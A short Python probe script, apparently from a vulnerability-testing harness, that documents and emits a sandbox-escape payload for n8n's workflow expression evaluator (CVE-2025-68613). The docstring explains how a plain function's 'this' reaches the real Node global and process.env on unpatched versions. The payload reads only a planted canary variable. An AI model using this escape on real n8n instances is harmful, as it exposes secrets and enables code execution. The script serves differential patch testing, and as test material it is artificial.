#!/usr/bin/env python3
"""[GIVEN] Original seed = CVE-2025-68613 (GHSA initial advisory).

n8n evaluates untrusted workflow expressions through its own JS sandbox (a
@n8n/tournament AST pipeline: PrototypeSanitizer blocks a property blocklist --
constructor / __proto__ / prototype -- and the whole thing compiles to a
Function that runs against a curated `data` context where `process`, `Function`,
`globalThis`, ... are shadowed away).

Before CVE-2025-68613 there was NO guard on a regular function's `this`. In
non-strict JS a plain `function(){...}` called as an IIFE has `this` === the
Node global object, so:

    {{ (function(){ return this.process.env.PCB_FLAG })() }}

reaches the REAL global -> real `process.env` -> the planted canary. This escapes
the sandbox on n8n-workflow 1.116.0 (V0, n8n 1.119.1).

The CVE-2025-68613 fix (n8n-workflow 1.119.0, n8n 1.122.0) added the
`FunctionThisSanitizer` AST *before*-hook, which rewrites every called/callback
FunctionExpression to bind `this` to `{ process: {} }`
(`(function(){...}).call({process:{}}, ...)`). So on V1 `this.process` is the
empty stub and `.env` is undefined -> BLOCKED. This is the differential
precondition. Benign framing: the payload only reads a planted env token.
"""


def candidate():
    return {
        "probe_id": "original-cve-2025-68613-regfn-this-binding",
        # regular-function IIFE: this === Node global on V0 -> real process.env
        "expr": "{{ (function(){ return this.process.env.PCB_FLAG })() }}",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate()))
